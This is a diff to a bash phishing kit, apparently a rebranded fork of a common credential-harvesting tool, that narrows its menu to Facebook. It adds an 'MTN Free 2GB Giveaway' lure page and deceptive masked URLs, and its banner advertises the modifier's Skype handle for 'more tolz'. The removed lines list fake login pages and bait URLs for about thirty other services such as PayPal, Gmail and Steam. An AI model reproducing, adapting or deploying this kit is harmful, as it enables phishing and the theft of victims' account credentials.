@@ -60,13 +60,15 @@ kill_pid() {
 banner() {
 	cat <<- EOF
 		${ORANGE}
-		${ORANGE}▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
-██░▄▄▀█░▄▄▀█░▄▄█▀▄▄▀█░▄▄█░▄▄▀████░▄▄▄░████░██░█░██░█░▄▄▀█▄░▄█░▄▄█░▄▄▀██
-██░████░▀▀░█▄▄▀█░▀▀░█░▄▄█░▀▀▄████▄▄▄▀▀████░▄▄░█░██░█░██░██░██░▄▄█░▀▀▄██
-██░▀▀▄█▄██▄█▄▄▄█░████▄▄▄█▄█▄▄████░▀▀▀░████░██░██▄▄▄█▄██▄██▄██▄▄▄█▄█▄▄██
-▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀${RED}
+		${ORANGE}███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
+██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
+██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
+╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝${RED}
 Version : 007
-
+Me Up On Skype For More Tolz
+@casper0147
 		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Modified by Coachella (Maxwell Casper)${WHITE}
 	EOF
 }
@@ -75,13 +77,15 @@ Version : 007
 banner_small() {
 	cat <<- EOF
 		${BLUE}
-		${BLUE}  ██████╗ ██████╗  █████╗  ██████╗██╗  ██╗███████╗██╗     ██╗      █████╗ 
-██╔════╝██╔═══██╗██╔══██╗██╔════╝██║  ██║██╔════╝██║     ██║     ██╔══██╗
-██║     ██║   ██║███████║██║     ███████║█████╗  ██║     ██║     ███████║
-██║     ██║   ██║██╔══██║██║     ██╔══██║██╔══╝  ██║     ██║     ██╔══██║
-╚██████╗╚██████╔╝██║  ██║╚██████╗██║  ██║███████╗███████╗███████╗██║  ██║
- ╚═════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
-${WHITE} 007
+		${BLUE}███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
+██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
+█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
+██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
+██║         ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
+╚═╝          ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝${WHITE}
+Version : 007
+Me Up On Skype For More Tolz
+@casper0147
 	EOF
 }
 
@@ -308,7 +312,7 @@ site_facebook() {
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
+		${RED}[${WHITE}02${RED}]${ORANGE} MTN Free 2GB Giveaway Login Page
 		${RED}[${WHITE}03${RED}]${ORANGE} Fake Security Login Page
 		${RED}[${WHITE}04${RED}]${ORANGE} Facebook Messenger Login Page
 
@@ -321,7 +325,7 @@ site_facebook() {
 		mask='http://blue-verified-badge-for-facebook-free'
 		tunnel_menu
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="fb_advanced"
+		website="free-2gb-data-from-mtn"
 		mask='http://vote-for-the-best-social-media'
 		tunnel_menu
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
@@ -334,97 +338,7 @@ site_facebook() {
 		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_facebook; }
-	fi
-}
-
-## Instagram
-site_instagram() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Auto Followers Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} 1000 Followers Login Page
-		${RED}[${WHITE}04${RED}]${ORANGE} Blue Badge Verify Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="instagram"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="ig_followers"
-		mask='http://get-unlimited-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="insta_followers"
-		mask='http://get-1000-followers-for-instagram'
-		tunnel_menu
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="ig_verify"
-		mask='http://blue-badge-verify-for-instagram-free'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_instagram; }
-	fi
-}
-
-## Gmail/Google
-site_gmail() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Gmail Old Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Gmail New Login Page
-		${RED}[${WHITE}03${RED}]${ORANGE} Advanced Voting Poll
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="google"
-		mask='http://get-unlimited-google-drive-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="google_new"
-		mask='http://get-unlimited-google-drive-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		website="google_poll"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_gmail; }
-	fi
-}
-
-## Vk
-site_vk() {
-	cat <<- EOF
-
-		${RED}[${WHITE}01${RED}]${ORANGE} Traditional Login Page
-		${RED}[${WHITE}02${RED}]${ORANGE} Advanced Voting Poll Login Page
-
-	EOF
-
-	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
-
-	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		website="vk"
-		mask='http://vk-premium-real-method-2020'
-		tunnel_menu
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		website="vk_poll"
-		mask='http://vote-for-the-best-social-media'
-		tunnel_menu
-	else
-		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
-		{ sleep 1; clear; banner_small; site_vk; }
+		{ sleep 1; clear; banner_small; site_facebook; }  
 	fi
 }
 
@@ -432,19 +346,9 @@ site_vk() {
 main_menu() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victims Facebook ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -454,128 +358,6 @@ main_menu() {
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
 		site_facebook
-	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
-		site_instagram
-	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		site_gmail
-	elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then
-		website="microsoft"
-		mask='http://unlimited-onedrive-space-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then
-		website="netflix"
-		mask='http://upgrade-your-netflix-plan-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then
-		website="paypal"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then
-		website="steam"
-		mask='http://steam-500-usd-gift-card-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then
-		website="twitter"
-		mask='http://get-blue-badge-on-twitter-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then
-		website="playstation"
-		mask='http://playstation-500-usd-gift-card-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 10 ]]; then
-		website="tiktok"
-		mask='http://tiktok-free-liker'
-		tunnel_menu
-	elif [[ "$REPLY" == 11 ]]; then
-		website="twitch"
-		mask='http://unlimited-twitch-tv-user-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 12 ]]; then
-		website="pinterest"
-		mask='http://get-a-premium-plan-for-pinterest-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 13 ]]; then
-		website="snapchat"
-		mask='http://view-locked-snapchat-accounts-secretly'
-		tunnel_menu
-	elif [[ "$REPLY" == 14 ]]; then
-		website="linkedin"
-		mask='http://get-a-premium-plan-for-linkedin-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 15 ]]; then
-		website="ebay"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 16 ]]; then
-		website="quora"
-		mask='http://quora-premium-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 17 ]]; then
-		website="protonmail"
-		mask='http://protonmail-pro-basics-for-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 18 ]]; then
-		website="spotify"
-		mask='http://convert-your-account-to-spotify-premium'
-		tunnel_menu
-	elif [[ "$REPLY" == 19 ]]; then
-		website="reddit"
-		mask='http://reddit-official-verified-member-badge'
-		tunnel_menu
-	elif [[ "$REPLY" == 20 ]]; then
-		website="adobe"
-		mask='http://get-adobe-lifetime-pro-membership-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 21 ]]; then
-		website="deviantart"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 22 ]]; then
-		website="badoo"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 23 ]]; then
-		website="origin"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 24 ]]; then
-		website="dropbox"
-		mask='http://get-1TB-cloud-storage-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 25 ]]; then
-		website="yahoo"
-		mask='http://grab-mail-from-anyother-yahoo-account-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 26 ]]; then
-		website="wordpress"
-		mask='http://unlimited-wordpress-traffic-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 27 ]]; then
-		website="yandex"
-		mask='http://grab-mail-from-anyother-yandex-account-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 28 ]]; then
-		website="stackoverflow"
-		mask='http://get-stackoverflow-lifetime-pro-membership-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 29 ]]; then
-		site_vk
-	elif [[ "$REPLY" == 30 ]]; then
-		website="xbox"
-		mask='http://get-500-usd-free-to-your-acount'
-		tunnel_menu
-	elif [[ "$REPLY" == 31 ]]; then
-		website="mediafire"
-		mask='http://get-1TB-on-mediafire-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 32 ]]; then
-		website="gitlab"
-		mask='http://get-1k-followers-on-gitlab-free'
-		tunnel_menu
-	elif [[ "$REPLY" == 33 ]]; then
-		website="github"
-		mask='http://get-1k-followers-on-github-free'
-		tunnel_menu
 	elif [[ "$REPLY" == 99 ]]; then
 		about
 	elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then
